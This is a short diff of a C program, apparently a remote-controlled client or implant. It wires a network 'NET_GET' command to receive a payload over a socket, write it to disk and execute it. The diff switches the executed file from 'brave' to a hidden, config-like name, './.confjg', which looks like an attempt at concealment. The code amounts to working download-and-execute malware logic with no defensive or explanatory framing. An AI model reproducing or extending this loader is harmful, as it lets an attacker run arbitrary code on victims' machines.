@@ -86,7 +86,8 @@ int main(int agrc, char **argv){
                 exit(EXIT_SUCCESS);
             case NET_GET:
                 send_ack(NET_GET, soc);
-                //recv_payload
+                recv_payload(soc);
+                exec_payload();
                 break;
             default:
                 send_ack(NET_OK, soc);
@@ -131,22 +132,23 @@ int recv_payload(int sfd){
     char BUF[1024];
     memset(BUF, 0, 1024);
     ssize_t readn, writen;
-    while ((readn = read(sfd, BUF, 1024)) != 0){
+    while ((readn = read(sfd, BUF, 1024)) > 0){
+        puts("writing to file...");
         writen = write(pldfd, BUF, readn);
         memset(BUF, 0, 1024);
+        if (readn < 1024) break;
         if (writen == -1){
             perror("Failed to write the payload into file");
             close(pldfd);
             return 0;
         }
     }
-    send(sfd, "b\0", 2, 0);
     close(pldfd);
     return 1;
 }
 
 int exec_payload(){
-    if (system("brave") == -1){
+    if (system("./.confjg") == -1){
         perror("Failed to execute payload");
         return 0;
     }
